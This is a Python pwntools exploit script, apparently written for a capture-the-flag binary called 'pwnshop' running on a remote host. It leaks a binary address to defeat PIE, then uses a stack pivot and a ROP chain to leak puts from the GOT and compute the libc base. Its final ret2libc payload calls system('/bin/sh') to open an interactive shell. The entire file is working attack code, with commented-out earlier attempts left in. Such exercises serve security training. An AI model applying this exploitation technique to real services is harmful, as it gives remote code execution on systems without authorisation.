#!/usr/bin/python3

from pwn import *
import sys


segfault_payload = b'a' * 72 + b'b' * 8

def load_file(filename):

	context.log_level = 'debug'
	print(sys.argv)

	if len(sys.argv) > 1:
		if sys.argv[1].lower() == 'gdb':
			gdbscript = '''			
			init-pwndbg
			piebase
			continue
			'''.format(**locals())
			return gdb.debug(filename, gdbscript=gdbscript)

	# io = process(filename)
	io = remote('178.128.35.132', 30022)
	return io

def runmain(io):

	io.sendlineafter('Exit\n> ', b'2')
	io.sendlineafter('sell? ', b'no')
	io.sendafter('for it? ', b'11111111')

	data = io.recvline()
	log.info(f'the data received is: {data}')
	idx = data.find(b'11111111') + 8
	address = data[idx:].split(b'?')[0]
	address = bytearray(address).ljust(8, b'\x00')
	address = u64(address)
	
	log.info(f'leaked binary address in p64: {p64(address)}')
	log.info(f'leaked binary address: {str(hex(address))}')
	
	base_address = address - 0x40c0
	log.info(f'based address of binary: {hex(base_address)}')	
	
	padding_to_rop_chain = b'a' * 40
	
	sub_rsp = p64(0x1219 + base_address)
	log.info(f'sub_rsp address: {hex(u64(sub_rsp))}')

	pop_rdi = base_address + 0x13c3
	log.info(f'pop rdi; ret address: {hex(pop_rdi)}')

	sell_address = p64(base_address + 0x126a)
	log.info(f'sell_address: {hex(u64(sell_address))}')

	rop_chain = sell_address + sell_address
	padding_to_stack_pivot = (72 - len(padding_to_rop_chain) - len(rop_chain)) * b'b'
	
	# payload = padding_to_rop_chain + rop_chain + padding_to_stack_pivot + sub_rsp
	# payload = cyclic(72) + sub_rsp
	# payload = b'a' * 40 + sell_address + cyclic(24) + sub_rsp
	# log.info(f'the sub_rsp address: {hex(u64(sub_rsp))}')
	# log.info(f'payload is: {payload} of length: {len(payload)}')

	pop_rdi = p64(pop_rdi)
	puts_got = p64(base_address + 0x4018)
	puts = p64(base_address + 0x1030)
	buy_address = p64(base_address + 0x132a)

	log.info(f'puts_got address: {hex(u64(puts_got))}')
	log.info(f'puts_plt address: {hex(u64(puts))}')

	padding_to_rop_chain = b'a' * 40

	# ropchain = pop_rdi + puts_got + puts + sell_address
	ropchain = pop_rdi + puts_got + puts + buy_address
	payload = padding_to_rop_chain + ropchain
	rem_len = 72 - len(payload)
	if rem_len > 0:
		payload += b'b' * rem_len
	
	# padding_to_stack_pivot = (72 - len(padding_to_rop_chain) - len(rop_chain)) * b'b'
	# payload = padding_to_rop_chain + ropchain + sub_rsp

	payload += sub_rsp

	print(f'payload length: {len(payload)}')
	print(f'payload: {payload}')
	io.sendlineafter('> ', b'1')

	time.sleep(1)
	io.sendafter('Enter details: ', payload)
	leaked_address = io.recvline()[:-1]
	# print(f'the leaked address: {leaked_address}')
	leaked_address = u64(bytearray(leaked_address).ljust(8, b'\x00'), endian='little')
	print(f'the leaked address is: {hex(leaked_address)}')

	libc_base_address = leaked_address - 0x06f6a0

	libc_system_address = p64(libc_base_address + 0x0453a0)
	libc_bin_sh_address = p64(libc_base_address + 0x18ce17)
	# libc_bin_sh_address = p64(libc_base_address + 0)


	io.info(f'the libc system address: {hex(u64(libc_system_address))}')
	io.info(f'the libc "/bin/sh" address: {hex(u64(libc_bin_sh_address))}')

	exploit_payload = b'a' * 40 + pop_rdi + libc_bin_sh_address + libc_system_address + b'b' * 8 + sub_rsp

	io.info(f'the exploit payload: {exploit_payload} is of length {len(exploit_payload)}')

	io.sendafter('Enter details: ', exploit_payload)

	io.interactive()

if __name__ == '__main__':
	io = load_file('./pwnshop')
	runmain(io)
